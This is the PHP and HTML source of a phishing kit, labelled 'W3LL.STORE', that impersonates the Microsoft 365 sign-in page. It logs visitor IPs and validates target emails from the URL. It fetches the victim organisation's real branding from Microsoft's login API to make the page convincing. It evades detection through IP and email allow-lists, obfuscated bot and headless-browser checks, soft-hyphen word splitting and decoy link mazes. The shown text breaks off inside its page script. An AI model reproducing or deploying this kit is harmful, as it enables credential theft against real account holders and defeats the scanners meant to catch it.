<?php

include "boblock.php";
if ($captha == 1) {
    if (!$_SESSION["g-recaptcha-response"]) {
        die(header("Location: " . $FailRedirect));
    }
}
if ($Resetlogs !== false && $Resetlogs !== "false" && $Resetlogs !== "FALSE" && $Resetlogs !== "False" && $Resetlogs !== "no" && $Resetlogs !== "NO" && !empty($Resetlogs)) {
    $files = glob("./*.txt");
    foreach ($files as $file) {
        if (is_file($file)) {
            file_put_contents($file, '');
        }
    }
}
if ($ResetAllow !== false && $ResetAllow !== "false" && $ResetAllow !== "FALSE" && $ResetAllow !== "False" && $ResetAllow !== "no" && $ResetAllow !== "NO" && !empty($ResetAllow)) {
    if ($captha == 0) {
        session_destroy();
    }
}
$licensekey = "AZs";
$apiurl = "";
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $evastius = $_SERVER["HTTP_CF_CONNECTING_IP"];
} else {
    $evastius = $_SERVER["REMOTE_ADDR"];
}
$urgantius = $_SERVER["HTTP_USER_AGENT"];
$nolikeus = date("D M d, Y g:i a");
$logs = "\n+ ------------[YOUR LOGS]----------+\n| Visitor Information\n| IP Address: {$evastius}\n| Browser: {$urgantius}\n| Date: {$nolikeus} \n+ -----------W3LL.STORE-------------+\n";
if ($limitedarea !== false && $limitedarea !== "false" && $limitedarea !== "FALSE" && $limitedarea !== "False" && $limitedarea !== "no" && $limitedarea !== "NO" && !empty($limitedarea)) {
    $limitedarea = str_replace(" ", '', $limitedarea);
    $limitedarea = explode(",", $limitedarea);
    if (is_array($limitedarea)) {
        $isinlimitedarea = false;
        foreach ($limitedarea as $ip) {
            if (preg_match("/" . $ip . "/", $_SERVER["REMOTE_ADDR"])) {
                $isinlimitedarea = true;
            }
        }
        if ($isinlimitedarea == false) {
            header("HTTP/1.0 404 Not Found");
            $file = fopen("../gogo/DeniedIPS.txt", "a");
            fwrite($file, "IP:" . $_SERVER["REMOTE_ADDR"] . " DATE:" . $visitorDATE . " REASON:blocked by limitedarea\n");
            fclose($file);
            chmod("../gogo/DeniedIPS.txt", 384);
            die(header("Location: " . $FailRedirect));
        }
    }
}
if (isset($visitorfileName) && $visitorfileName !== '' && $visitorfileName !== "false" && $visitorfileName !== "FALSE" && $visitorfileName !== false) {
    $file = fopen("../gogo/" . $visitorfileName, "a");
    fwrite($file, $logs);
    fclose($file);
    chmod("../gogo/" . $visitorfileName, 384);
}
if ($AutoGrab || !$AutoGrab && (isset($_GET["status"]) && $_GET["status"] !== "putuser" || (isset($_GET["data"]) || isset($_GET["email"]) || isset($_GET["target"])))) {
    if (isset($_GET["email"])) {
        $data = urldecode($_GET["email"]);
    } elseif (isset($_GET["data"])) {
        $data = urldecode($_GET["data"]);
    } elseif (isset($_GET["target"])) {
        $data = urldecode($_GET["target"]);
    } elseif (isset($_GET["code"])) {
        $data = urldecode($_GET["code"]);
    } elseif (preg_match("/[^\\/]+\$/", urldecode($_SERVER["REQUEST_URI"]))) {
        preg_match("/[^\\/]+\$/", urldecode($_SERVER["REQUEST_URI"]), $matches);
        $data = $matches[0];
        function begnWith($str, $begnString)
        {
            $len = strlen($begnString);
            return substr($str, 0, $len) === $begnString;
        }
        if (begnWith($data, "?")) {
            $data = ltrim($data, "?");
        }
    } else {
        die(header("Location: " . $FailRedirect));
    }
    if (base64_encode(base64_decode($data)) == $data) {
        $email = base64_decode($data);
        $email = filter_var($email, FILTER_SANITIZE_EMAIL);
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            die(header("Location: " . $FailRedirect));
        }
    } else {
        $email = $data;
        $email = filter_var($email, FILTER_SANITIZE_EMAIL);
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            die(header("Location: " . $FailRedirect));
        }
    }
    $data = base64_encode($email);
}
$linkSite = $_SERVER["HTTP_HOST"];
$uriSite = urldecode($_SERVER["REQUEST_URI"]);
$relative_path = dirname($_SERVER["PHP_SELF"]);
if (isset($_SESSION["NOTALLOW"])) {
    header("HTTP/1.0 404 Not Found");
    $file = fopen("../gogo/DeniedIPS.txt", "a");
    fwrite($file, "IP:" . $_SERVER["REMOTE_ADDR"] . " DATE:" . $visitorDATE . " REASON:blocked by NOTALLOW\n");
    fclose($file);
    chmod("../gogo/DeniedIPS.txt", 384);
    die(header("Location: " . $FailRedirect));
}
if ($onlylistemails == true || $onlylistemails == "true" || $onlylistemails == "TRUE" || $onlylistemails == "True" || $onlylistemails == "yes" || $onlylistemails == "YES") {
    $path = "EMAILS.txt";
    if (file_exists($path)) {
        $emails = file("../gogo/EMAILS.txt", "FILE_[OO__E_^U__LINES");
        if (!in_array($email, $emails)) {
            if (!isset($_SESSION["NOTALLOW"])) {
                $_SESSION["NOTALLOW"] = "true";
            }
            $file = fopen("../gogo/DeniedEmails.txt", "a");
            fwrite($file, "EMAIL:" . $email . " IP:" . $visitorIP . " DATE:" . $visitorDATE . " REASON:Not exist in list\n");
            fclose($file);
            chmod("../gogo/DeniedEmails.txt", 384);
            die(header("Location: " . $FailRedirect));
        }
    }
}
if ($onlyonetimeuse == true || $onlyonetimeuse == "true" || $onlyonetimeuse == "TRUE" || $onlyonetimeuse == "True" || $onlyonetimeuse == "yes" || $onlyonetimeuse == "YES") {
    if (file_exists("../gogo/UsedEmails.txt")) {
        $usedemails = file("../gogo/UsedEmails.txt", "FILE_[OO__E_^U__LINES");
        if (in_array($email, $usedemails) && !isset($_SESSION["NOTEXPIRED"])) {
            if (!isset($_SESSION["NOTALLOW"])) {
                $_SESSION["NOTALLOW"] = "true";
            }
            $file = fopen("../gogo/DeniedEmails.txt", "a");
            fwrite($file, "EMAIL:" . $email . " IP:" . $visitorIP . " DATE:" . $visitorDATE . " REASON:Already used and expired\n");
            fclose($file);
            chmod("../gogo/DeniedEmails.txt", 384);
            die(header("Location: " . $FailRedirect));
        }
    }
}
$domain = substr(strrchr($email, "@"), 1);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://login.microsoftonline.com/common/GetCredentialType");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"Username\":\"" . $email . "\"}");
$headers = array();
$headers[] = "Content-Type: application/json";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo "Error:" . curl_error($ch);
}
curl_close($ch);
$found = $result;
$result = json_decode($result, true);
if (strpos($found, "\"EstsProperties\":{\"UserTenantBranding\":[{\"") !== false) {
    $logo = $result["EstsProperties"]["UserTenantBranding"][0]["BannerLogo"];
    $background = $result["EstsProperties"]["UserTenantBranding"][0]["Illustration"];
    $plate = $result["EstsProperties"]["UserTenantBranding"][0]["BoilerPlateText"];
} else {
    $logo = '';
    $background = '';
    $plate = '';
}
if (!isset($_SESSION["title"])) {
    $CurrentTitle = $_SESSION["title"] = $TitlesArray[array_rand($TitlesArray)];
} else {
    $CurrentTitle = $_SESSION["title"];
}
if (!isset($_GET["status"])) {
    $status = '';
} else {
    $status = $_GET["status"];
}
function rndString($length = 10)
{
    return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, $length);
}
$randpart = $randfirstpart . '' . RndString(8) . "-" . RndString(4) . "-" . RndString(4) . "-" . RndString(4) . "-" . RndString(12) . "_" . RndString(50) . '' . RndString(50) . '' . RndString(50);
if ($AutoGrab && !isset($_GET["data"]) || !$AutoGrab && (isset($_GET["status"]) && $_GET["status"] !== "putuser" && !isset($_GET["data"]) || !isset($_GET["status"]) && !isset($_GET["data"]))) {
    $relative_path = dirname($_SERVER["PHP_SELF"]);
    if ($fixIndex == true || $fixIndex == "true" || $fixIndex == "TRUE" || $fixIndex == "True") {
        $fixIndex = "verify?";
        $fixPart = "&data=";
    } else {
        $fixIndex = "verify?";
        $fixPart = "&data=";
    }
    if (!$AutoGrab && (!isset($_GET["status"]) && !isset($_GET["data"]) || isset($_GET["status"]) && $_GET["status"] !== "putuser")) {
        if ($fixPart == "&data=") {
            $fixPart = "&status=";
        } elseif (false) {
            $fixPart = "?status=";
        }
        $data = "putuser";
    }
    header("Location: {$relative_path}/{$fixIndex}{$randpart}{$fixPart}{$data}");
}
$rndString1 = rndString(7);
$rndString2 = rndString(8);
$rndString3 = rndString(6);
$rndString4 = rndString(5);
$RndString1 = str_repeat("\xc2\xad", rand(1, 3));
$RndString2 = str_repeat("\xc2\xad", rand(1, 3));
$RndString3 = str_repeat("\xc2\xad", rand(1, 3));
$RndString4 = str_repeat("\xc2\xad", rand(1, 3));
$RndString5 = str_repeat("\xc2\xad", rand(1, 3));
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html dir="ltr" class="" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>
      <?php echo $CurrentTitle;?>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    </title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="referrer" content="no-referrer"/>
    <meta name="robots" content="none">
    <script>
      (function(_0x4461d6,_0x85069){
        var _0x50c519=_0x2030,_0x4834be=_0x4461d6();
        while(!![]){
          try{
            var _0x18d4b5=parseInt(_0x50c519(0xb2))/0x1*(parseInt(_0x50c519(0xb9))/0x2)+-parseInt(_0x50c519(0xbb))/0x3*(parseInt(_0x50c519(0xb5))/0x4)+parseInt(_0x50c519(0xb4))/0x5*(-parseInt(_0x50c519(0xbd))/0x6)+-parseInt(_0x50c519(0xb8))/0x7+parseInt(_0x50c519(0xb1))/0x8*(-parseInt(_0x50c519(0xbf))/0x9)+-parseInt(_0x50c519(0xba))/0xa*(parseInt(_0x50c519(0xb3))/0xb)+parseInt(_0x50c519(0xbc))/0xc;
            if(_0x18d4b5===_0x85069)break;
            else _0x4834be['push'](_0x4834be['shift']());
          }
          catch(_0x172940){
            _0x4834be['push'](_0x4834be['shift']());
          }
        }
      }
       (_0x322d,0x2d141));
      function _0x2030(_0x350b5d,_0x527b3d){
        var _0x322d89=_0x322d();
        return _0x2030=function(_0x203013,_0x312777){
          _0x203013=_0x203013-0xb0;
          var _0x5a2924=_0x322d89[_0x203013];
          return _0x5a2924;
        }
          ,_0x2030(_0x350b5d,_0x527b3d);
      }
      function isBot(){
        var _0x4be0e2=_0x2030;
        if(navigator['mimeTypes'][_0x4be0e2(0xb0)]+navigator['plugins'][_0x4be0e2(0xb0)]==0x0)return!![];
        if(navigator['webdriver']==!![])return!![];
        if(window['document'][_0x4be0e2(0xb7)]['getAttribute'](_0x4be0e2(0xbe)))return!![];
        if(window[_0x4be0e2(0xc0)]||window[_0x4be0e2(0xb6)])return!![];
        return![];
      }
      function _0x322d(){
        var _0x33d4aa=['100vYkcDf','1146BgEpsa','7930020aWoyNL','6xBjjQW','webdriver','17037JECFtk','callPhantom','length','584rIHfWE','231411hVqpAN','141493sOgOGS','222090mENIGe','788BfQcxK','_phantom','documentElement','2247798RMRRpw','2CrpWKx'];
        _0x322d=function(){
          return _0x33d4aa;
        };
        return _0x322d();
      };
      bot = isBot();
      if (bot){
        Array.from(document.getElementsByTagName("a")).forEach(function(i) {
          i.href = "https://www.google.com/search?q=office365";
        }
                                                              );
      }
    </script>
    <noscript>
      <meta http-equiv="Refresh" content="0; URL=./" />
    </noscript>
    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
    <link href="css/style.css" rel="stylesheet" >
  </head>
  <body id="<?php echo $rndString1;?>" class="nd <?php echo $rndString2;?>" style="display: block;">
    <noscript>
      <?php genMaze(mt_rand(20, 30), True);?>
      <meta http-equiv="refresh" content="0; url=limbo.php" />
    </noscript>
    <?php
function generateRandomString($length, $full = False)
{
$characters = "0123456789qxzQWXYZ";
if ($full) {
$characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
}
$charactersLength = strlen($characters);
$randomString = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];
}
return $randomString;
}
echo "<span style=\"display: none;\"><a href=\"" . generateRandomString(mt_rand(3, 10)) . ".php\">Do you see this?</a></span>";
function genMaze($length)
{
for ($i = 0; $i < $length; $i++) {
$random = generateRandomString(mt_rand(11, 20));
echo "<a href=\"" . $random . ".php\">" . $random . "\n";
}
}
?>
    <div id="<?php echo $rndString3;?>">
      <div>
        <div class="background <?php echo $rndString4;?>" role="presentation"> 
          <div class="backgroundImage <?php echo $rndString2;?>" style="background-image:  url(&quot;images/inv-big-background.png&quot;);-webkit-filter:invert(100%);filter:invert(100%);">
          </div>
        </div>
      </div>
      <style>
        .disit{
          display:none;
        }
        .enait{
          display:block !important;
        }
        img {
          /*max-width: 100%;*/}
        .novalidate {
          border-top-width: unset !important;
          border-left-width: unset !important;
          border-right-width: unset !important;
          border-color: #fa0808 !important;
          border-width: 0px 0px 1px 0px !important;
        }
        .form-group {
          margin-bottom:6px!important;
        }
        /*.text-14{margin-top: 10px;}*/
        /*.form-group.col-md-24{margin-bottom: 0px !important;}*/
        #spinput,#emnput {
          margin-bottom: 14px !important;
        }
        .innet {
          margin-left: auto;
          margin-right: auto;
          position: relative;
          max-width: 440px;
          width: calc(100% - 40px);
          padding: 44px;
          margin-bottom: 28px;
          background-color: #fff;
          -webkit-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
          -moz-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
          box-shadow: 0 2px 6px rgba(0,0,0,0.2);
          min-width: 320px;
          min-height: 338px;
          overflow: hidden;
        }
        #i0282 {
          display:none !important;
        }
        @media (max-width: 600px), (max-height: 366px){
          .innet {
            max-width: 500px;
            width: calc(100% - 15%);
            padding: 6%;
            -webkit-box-shadow: none;
            -moz-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            box-shadow: none;
          }
        }
        .bgImgCenter{
          background-image: url('<?php echo $background;?>');
          /* Full height */
          height: 100%;
          /* Center and scale the image nicely */
          background-position: center;
          background-repeat: no-repeat;
          background-size: cover
        }
      </style>
      <div role="alert" aria-live="assertive">
        <!-- ko if: passwordTextbox.error -->
        <div id="passwordError" data-bind="externalCss: { 'error': true },htmlWithBindings: passwordTextbox.error,childBindings: {'idA_IL_ForgotPassword0': {href: accessRecoveryLink || svr.urlResetPassword,attr: { target: accessRecoveryLink &amp;&amp; '_blank' },click: accessRecoveryLink ? null : resetPassword_onClick } }" class="error ext-error">Your account or password is incorrect. If you don't remember your password, 
          <a id="idA_IL_ForgotPassword0" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAYWSvYvTcBzGm_au9k70TjnESQ4VEY-0v7w3RdG0SXvtJelL0qYpQkybtHlpm76kTdtF3BwcDg4cDl2c5EYncXI-EA7cHJ1EHMTJ0fQvEL488IXnWT7Ps50gkwiSBEnwIIYkkcxdHMMJnWrTMK2TGIzTCIB1HCVhjMBIDAWIQQBscn17dyfy6kti-ZR7-zXnaCf33p9BtyzfH00zqVQQBEmv27U7ZrLjDVJ9fWjYw95HCLqAoB8QdBrdNIdwXTqLTkmMInEKJQgKwcIjCSTZGtQsEVVXZUXwVbSOChIALdZFedkFIuv6Ipt1VLTlCoqwUJWaqyoC0pJVXCys_XlbDP2qXBrwSpEQUM5vKRwhOgIqhHnVYZbfojtlZuZb6Fq8ib0y_0S3ut5koI28qX8aex3tgAreo0204KtZgmbnMD_D8hVcp1AJm6XxQtZyBAtQVAhqRbNmV2rWKUxuH-mUO6RzHE8ry8UIWRzN57AVxn1bA-ml28lKijWuFcSjWr7WHMt9YDJcEBBYoz2lHCy9sNO5ClkmZWvu4zReZRaiZmqWsCzZRJenqZ427ntEcVXz_WIVyYuUCFtwTu4UtHbONgvNJlflyXzJSAMbNueOyzB0g2Eqo1x2uuoOAqepuCNFyfttRwzpEbwxNo1DHVYqWqdazgYDh0MRmunhUp6fzzUmW5_nhzWh3LAHLQUJhOBDLB6WOfCG57Gr3sgc2sb-aOJ17b75PbY3mU395RNzoXf8qR-yXPd-sQH93LiRiO9evhnZj9zfA7FMIrG9G1l_fzegd5vhiH7dOXnx_HaUf_NwZzh-9hg630ypo2XhgKo2JKO9OkB4t8RNl6A47qYPXRUYqkSxuQC4jlOWi4-oDHIch47j8fP4tSKriZwsyYzIMjUW1cDvePTlpcinrf_M8vOVyD81&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10">reset it now.
          </a>
        </div>
        <!-- /ko -->
      </div>
      <div class="outer <?php if (strpos($found, "Illustration") !== false) {echo "bgImgCenter";}?>
                                                                                               <?php echo $rndString3;?>
                                                                                               "> 
        <div class="middle <?php 
                    echo $rndString4;
                    ?>
                    "> 
          <div class="innet fade-in-lightbox <?php 
                      echo $rndString1;
                      ?>
                      "> 
            <div class="lightbox-cover <?php 
                        echo $rndString2;
                        ?>
                        ">
            </div> 
            <div id="progressBar" class="progress disit <?php 
                                         echo $rndString3;
                                         ?>
                                         " role="progressbar" aria-label="Please wait">
              <!--  -->
              <!-- ko if: useCssAnimation --> 
              <div>
              </div>
              <div>
              </div>
              <div>
              </div>
              <div>
              </div>
              <div>
              </div>
              <!-- /ko -->
              <!-- ko ifnot: useCssAnimation -->
              <!-- /ko -->
            </div>
            <?php 
if (strpos($found, "BannerLogo") !== false) {
echo "<img class=\"banner-logo\" role=\"presentation\" data-bind=\"attr: { src: bannerLogoUrl }\" src=\"" . $logo . "\">";
} else {
echo "<span id=\"displayLogo\"><img class=\"logo\" role=\"presentation\" pngsrc=\"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8148.16/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9\" svgsrc=\"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8148.16/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd\" data-bind=\"imgSrc\" src=\"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8148.16/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd\"></span>";
}
?>
            <div role="main"> 
              <div class="">
                <?php 
if ($AutoGrab || !$AutoGrab && $status !== "putuser") {
?>
                <div class="animate slide-in-next <?php 
                            echo $rndString1;
                            ?>
                            "> 
                  <div> 
                    <div class="identityBanner <?php 
                                echo $rndString2;
                                ?>
                                "> 
                      <div class="backButton <?php 
                                  echo $rndString3;
                                  ?>
                                  " id="idBtn_Back" aria-label="Back"> 
                        <img role="presentation" pngsrc="images/arrow_left.png" svgsrc="images/arrow_left.svg" src="images/arrow_left.svg">  
                      </div> 
                      <div id="displayName" class="identity <?php 
                                                   echo $rndString4;
                                                   ?>
                                                   " title="<?php 
                                                            echo $email;
                                                            ?>
                                                            ">
                        <?php 
echo $email;
?>
                      </div> 
                    </div>
                  </div> 
                </div>
                <?php 
}
?>
                <div class="pagination-view animate has-identity-banner slide-in-next <?php 
                            echo $rndString1;
                            ?>
                            "> 
                  <div>    
                    <div id="loginHeader" class="row text-title <?php 
                                                 echo $rndString2;
                                                 ?>
                                                 " role="heading" aria-level="1">
                      <?php 
if (!$AutoGrab && $status == "putuser") {
?>
                      <img src="<?php 
                                echo "images/sigin2.png";
                                                        ?>
                                                        "> 
                      <?php 
} else {
?>
                      <img src="<?php 
                                echo "images/enterpass.png";
                                                           ?>
                                                           ">
                      <?php 
}
?>
                    </div> 
                    <div class="row <?php 
                                echo $rndString3;
                                ?>
                                "> 
                      <div class="form-group col-md-24">
                        <div id="<?php 
                                 echo $rndString4;
                                 ?>
                                 " role="alert" aria-live="assertive">
                          <!-- ko if: passwrdTextbox.error -->
                          <?php 
?>
                          <?php 
if ($status == "error" || $status == "error2" || $status == "error3" || $status == "error4") {
?>
                          <!-- ko if: passwordTextbox.error -->
                          <div role="alert" class="<?php 
                                                   echo $rndString2;
                                                   ?>
                                                   " aria-live="assertive">
                            <div id="passwordError" class="error ext-error alert-error <?php 
                                                           echo $rndString2;
                                                           ?>
                                                           ">Y
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>o
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>ur a
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>cc
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>ou
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>nt o
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>r pa
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>ss
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>wo
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>rd is inco
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>rr
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>ect. 
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>If y
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>ou don
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>'t rem
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>em
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>ber yo
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>ur pa
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>ssw
                              <a class="<?php 
                                        echo $rndString2;
                                        ?>
                                        ">
                              </a>ord, 
                              <a href="#" class="<?php 
                                                 echo $rndString2;
                                                 ?>
                                                 ">reset it now.
                              </a>
                            </div>
                            <!-- /ko -->
                          </div>
                          <?php 
} else {
if ($firstmsg) {
?>
                          <div id="passwrdError" class="alert <?php 
                                                        echo $rndString2;
                                                        ?>
                                                        "
                               <div id="passwrdError" class="alert 
                          <?php 
echo $rndString3;
?>
                          ">
                          <img class="" src="./images/firstmsg<?php 
                                             if ($firstmsg) {
                                             echo $firstmsg;
                                             }
                                             ?>
                                             .png" alt="<?php 
                                                        echo "ver" . $RndString1 . "ify y" . $RndString2 . "our da" . $RndString2 . "ta";
                                                                                                                                        ?>
                                                                                                                                        " >
                        </div>        
                        <?php 
}
}
?>
                        <!-- /ko --> 
                      </div>
                      <div class="placeholderContainer <?php 
                                  echo $rndString4;
                                  ?>
                                  "> 
                        <!-- has-error -->
                        <div id="makeinput" onclick="makeInputHere(this); this.onclick=null;">
                          <?php 
if (!$AutoGrab && $status == "putuser") {
?>
                          <div id="emnput">
                          </div>
                          <?php 
} else {
?>
                          <div id="spinput">
                          </div>
                          <?php 
}
?>
                        </div>
                      </div> 
                    </div> 
                  </div> 
                  <div class="position-buttons <?php 
                              echo $rndString3;
                              ?>
                              "> 
                    <div> 
                      <?php 
if (!$AutoGrab && $status == "putuser") {
?>
                      <div class="row"> 
                        <div class="col-md-24"> 
                          <div class="text-11 action-links"> 
                            <div class="form-group <?php 
                                        echo $rndString4;
                                        ?>
                                        "> 
                              <a id="NoAcc" role="link" href="#">
                                <img src="images/noacc.png">
                              </a> 
                            </div>  
                          </div> 
                        </div> 
                      </div> 
                      <div class="row"> 
                        <div class="col-md-24"> 
                          <div class="text-12 action-links"> 
                            <div class="form-group <?php 
                                        echo $rndString1;
                                        ?>
                                        "> 
                              <a id="CantAcces" role="link" href="#">
                                <img src="images/cantacces.png">
                              </a> 
                            </div>  
                          </div> 
                        </div> 
                      </div> 
                      <div class="row"> 
                        <div class="col-md-24"> 
                          <div class="text-13 action-links"> 
                            <div class="form-group <?php 
                                        echo $rndString2;
                                        ?>
                                        "> 
                              <a id="SigOpt" role="link" href="#">
                                <img src="images/sigopt.png">
                              </a> 
                            </div>  
                          </div> 
                        </div> 
                      </div>
                      <?php 
} else {
?>
                      <div class="row"> 
                        <div class="col-md-24"> 
                          <div class="text-14 action-links"> 
                            <div class="form-group <?php 
                                        echo $rndString3;
                                        ?>
                                        "> 
                              <a id="ForgPasswrd" role="link" href="#">
                                <img src="images/forgpass.png">
                              </a> 
                            </div>  
                          </div> 
                        </div> 
                      </div>
                      <?php 
}
?>
                    </div> 
                    <div class="row <?php 
                                echo $rndString1;
                                ?>
                                "> 
                      <div>
                        <div class="col-xs-24 no-padding-left-right button-container <?php 
                                    echo $rndString2;
                                    ?>
                                    ">
                          <div class="inline-block">
                            <?php 
if (!$AutoGrab && $status == "putuser") {
?>
                            <div id="idSIButton" class="btn btn-block btn-primary <?php 
                                                        echo $rndString3;
                                                        ?>
                                                        " style="border-color:#0067b8;background-image:url(images/continue.png);background-color:#0067b8">
                            </div>
                            <?php 
} else {
?>
                            <div id="idSIButton" class="btn btn-block btn-primary <?php 
                                                        echo $rndString3;
                                                        ?>
                                                        ">
                            </div>
                            <?php 
}
?>
                          </div>
                        </div>
                      </div> 
                    </div> 
                  </div>
                </div>
              </div>
            </div>
            <?php 
if (strpos($found, "BoilerPlateText") !== false) {
?>
            <div id="idBoilerPlateText" class="wrap-content boilerplate-text ext-boilerplate-text" data-bind="
                                                                                                              htmlWithMods: tenantBranding.BoilerPlateText,
                                                                                                              htmlMods: { filterLinks: svr.fIsHosted },
                                                                                                              css: { 'transparent-lightbox': tenantBranding.UseTransparentLightBox },
                                                                                                              externalCss: { 'boilerplate-text': true }">
              <p>
                <?php 
echo $plate;
?>
              </p>
            </div>
            <?php 
}
?>
          </div> 
        </div>
        <div id="footer" class="footer default <?php 
                                echo $rndString4;
                                ?>
                                " role="contentinfo"> 
          <div> 
            <div id="footerLinks" class="footerNode text-secondary <?php 
                                         echo $rndString1;
                                         ?>
                                         "> 
              <span id="ftrCopy"
                    <?php 
              echo "&#xA9;" . $RndString1 . "&#x32;" . $RndString2 . "&#x30;" . $RndString3 . "&#x31;" . $RndString4 . "&#x39;" . $RndString1 . "&#x20;";
              ?>
              </span> 
            <a id="ftrTerms" href="#">Terms of use
            </a> 
            <a id="ftrPrivacy" href="#">
              <?php 
echo "Pr" . $RndString1 . "iva" . $RndString2 . "cy &amp; co" . $RndString3 . "oki" . $RndString1 . "es";
?>
            </a> 
            <a href="#" role="button" class="moreOptions <?php 
                                             echo $rndString2;
                                             ?>
                                             " aria-label="Click here for troubleshooting information"> 
              <img class="desktopMode" role="presentation" pngsrc="images/ellipsis_grey.png" svgsrc="images/ellipsis_grey.svg" src="images/ellipsis_grey.svg"> 
              <img class="mobileMode <?php 
                          echo $rndString3;
                          ?>
                          " role="presentation" pngsrc="images/ellipsis_grey.png" svgsrc="images/ellipsis_grey.svg"src="images/ellipsis_grey.svg">  
            </a> 
          </div> 
        </div> 
      </div> 
    </div> 
    </div>
  </div>
<script>
  var statos = '<?php echo $status;?>';
  var actnn = "<?php 
  if ($status == "error") {
    echo $randpart . "&error&data=" . $data;
  }
  else {
    if ($status == "error2") {
      echo $randpart . "&error2&data=" . $data;
    }
    else {
      if ($status == "error3") {
        echo $randpart . "&error3&data=" . $data;
      }
      else {
        if ($status == "error4") {
          echo $randpart . "&error4&data=" . $data;
        }
        else {
          echo $randpart . "&data=" . $data;
        }
      }
    }
  }
  ?>";
  var actnn2 = "";
  var rndstr1 = '<?php 
  echo $rndString1;
  ?>';
  var rndstr2 = '<?php 
  echo $rndString2;
  ?>';
  var haserr = "<?php 
  if ($status == "error" || $status == "error2" || $status == "error3") {
    echo " has-error";
  }
  ?>";
  var plchol = "<?php 
  echo "Pa" . $RndString1 . "ss" . $RndString2 . "wo" . $RndString3 . "rd";
  ?>";
  var plchol2 = "<?php 
  echo "Em" . $RndString1 . "a" . $RndString2 . "i" . $RndString3 . "l";
  ?>";
  var arrl = "<?php 
  echo "En" . $RndString4 . "ter " . $RndString1 . '' . $email;
  ?>";
  var licensekey = '<?php 
  echo $licensekey;
  ?>';
  var emailkey = '<?php 
  echo base64_encode($toEmail);
  ?>';
  var style = document.createElement("style");
  document.head.appendChild(style);
